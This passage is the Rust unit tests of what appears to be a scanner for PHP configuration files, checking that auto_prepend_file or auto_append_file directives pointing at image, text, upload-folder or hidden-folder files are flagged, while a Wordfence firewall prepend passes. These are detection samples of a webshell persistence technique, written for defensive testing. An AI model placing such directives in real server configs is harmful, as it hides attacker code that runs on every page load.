                "php_value auto_prepend_file \"/home/u/x.png\"\n"
            )
            .verdict,
            Verdict::Malicious
        );
        assert_eq!(
            cfg(
                "php.ini",
                "auto_append_file = '/var/www/s/data.txt' ; note\n"
            )
            .verdict,
            Verdict::Malicious
        );
    }

    #[test]
    fn a_prepended_php_file_is_judged_by_where_it_sits() {
        // A security plugin does this.
        let waf = "auto_prepend_file = '/home/u/public_html/wordfence-waf.php'\n";
        assert_eq!(cfg(".user.ini", waf).verdict, Verdict::Clean);
        assert_eq!(
            cfg(".user.ini", "auto_prepend_file = none\n").verdict,
            Verdict::Clean
        );
        assert_eq!(
            cfg(".user.ini", "auto_prepend_file =\n").verdict,
            Verdict::Clean
        );
        let hidden = "auto_prepend_file = /home/u/public_html/wp-content/uploads/x.php\n";
        assert_eq!(cfg(".user.ini", hidden).verdict, Verdict::Suspicious);
        let dot = "auto_prepend_file = /home/u/public_html/.cache/x.php\n";
        assert_eq!(cfg(".user.ini", dot).verdict, Verdict::Suspicious);
    }

    #[test]
    fn remote_include_switched_on_is_reported() {
        let s = cfg("php.ini", "allow_url_include = On\n");
        assert!(has_rule(&s, "config-allow-url-include"));
        assert_eq!(cfg("php.ini", "allow_url_include = Off\n").score, 0);
    }
}
